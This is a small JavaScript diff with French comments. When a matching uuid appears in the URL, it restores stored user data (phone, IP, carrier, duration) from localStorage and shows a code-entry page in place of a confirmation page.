@@ -956,8 +956,14 @@ const action = urlParams.get('action');
 if (uuidFromUrl && action === 'code') {
     const storedData = JSON.parse(localStorage.getItem('snap_data') || '{}');
     if (storedData.uuid && uuidFromUrl === storedData.uuid) {
-        document.getElementById('displayPhone').textContent = storedData.phone;
-        showPage('page4');
+        // On restaure les données globales avec celles du localStorage
+        userData = storedData; 
+        userIP = storedData.ip || 'unknown';
+        selectedOperator = storedData.operator || '';
+        selectedDuration = storedData.duration || '6mois';
+        
+        // On affiche le formulaire pour entrer le code (page3)
+        showPage('page3');
     } else {
         window.location.href = window.location.pathname;
     }
